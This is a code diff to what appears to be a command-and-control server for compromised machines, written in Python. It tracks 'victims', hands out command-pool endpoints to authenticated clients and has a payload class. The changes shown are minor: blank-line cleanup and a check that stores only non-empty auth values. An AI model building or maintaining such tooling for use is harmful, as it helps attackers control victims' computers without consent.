@@ -9,7 +9,6 @@ import os
 """
 written by otter - github.com/whatotter
 supported by Fan2K - github.com/Christian93111
-
 """
 
 vicInfo = {} # info of victims
@@ -80,7 +79,8 @@ class azamukuHandler(BaseHTTPRequestHandler):
                 self.wfile.write(a)
                 return
             else:
-                if enableGrab:
+                if enableGrab and auth:
+                    # only append a non-empty auth value
                     authorized.append(auth)
                     self._send_response()
                     a = random.choice(endpoints).encode('ascii')
@@ -126,7 +126,6 @@ class azamukuHandler(BaseHTTPRequestHandler):
         #     return
 
         if self.path[1:] in endpoints: # if its a *command pool endpoint*
-
 
             if auth == None:
                 self._send_response(404)
@@ -188,7 +187,6 @@ class azamukuHandler(BaseHTTPRequestHandler):
             client_ips[auth] = client_ip
 
         if self.path[1:] in endpoints: # if its a *command pool endpoint*
-
 
             if auth == None:
                 self._send_response(404)
@@ -311,7 +309,6 @@ class azamuku:
     #     self.hotplugServer = httpd
     #     httpd.serve_forever()
 
-
     """ etc. """
     def set_endpoints(self, file="./core/masks/endpoints.txt"):
         global endpoints
@@ -367,9 +364,7 @@ class azamuku:
     #         self.hotplugServer.shutdown()
 
     #     return True
-    
-    
-    
+
 class payload:
     def genUID(y=32, chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):
         global authorized
